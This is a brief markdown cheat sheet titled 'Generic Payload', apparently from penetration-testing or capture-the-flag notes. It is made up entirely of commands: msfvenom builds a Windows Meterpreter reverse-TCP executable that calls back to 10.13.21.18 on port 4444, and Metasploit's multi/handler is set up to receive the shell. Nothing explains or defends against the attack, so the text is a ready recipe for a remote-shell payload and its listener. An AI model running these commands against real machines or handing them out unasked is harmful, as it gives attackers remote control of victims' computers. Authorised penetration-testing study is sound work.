## Generic Payload

* msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.21.18 LPORT=4444 -f exe > shell.exe
* use exploit/multi/handler
* set payload windows/meterpreter/reverse_tcp
* set LHOST 10.13.21.18
